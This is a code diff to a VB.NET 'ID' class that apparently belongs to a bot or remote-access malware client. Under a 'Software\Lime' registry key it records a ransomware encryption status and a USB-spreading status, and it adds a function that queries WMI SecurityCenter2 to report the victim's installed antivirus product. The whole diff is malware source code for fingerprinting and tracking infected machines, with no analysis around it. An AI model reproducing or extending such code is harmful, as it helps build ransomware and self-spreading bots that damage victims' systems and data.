@@ -1,4 +1,6 @@
 ﻿
+Imports System.Management
+
 Public Class ID
 
     Public Shared Function Bot()
@@ -115,7 +117,7 @@ Public Class ID
             If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing) Is Nothing Then
                 My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
                 My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Not encrypted")
-                Return readValue
+                Return "Not encrypted"
             Else
                 Return readValue
             End If
@@ -201,6 +203,42 @@ Public Class ID
             Return "Error"
         End Try
 
+    End Function
+
+    Public Shared Function USBSP()
+        If Settings.USB = True Then
+            Try
+                Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
+                If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing) Is Nothing Then
+                    My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "USB", "Not yet")
+                    Return readValue
+                Else
+                    Return readValue
+                End If
+            Catch ex As Exception
+                Return "Error"
+            End Try
+        Else
+            Return "Disabled"
+        End If
+    End Function
+
+    Public Shared Function AV() As String
+        Try
+            Dim str As String = Nothing
+            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
+            Dim instances As ManagementObjectCollection = searcher.[Get]()
+            For Each queryObj As ManagementObject In instances
+                str = queryObj("displayName").ToString()
+            Next
+            If str = String.Empty Then str = "N/A"
+            str = str.ToString
+            Return str
+            searcher.Dispose()
+        Catch
+            Return "N/A"
+        End Try
     End Function
 
 End Class
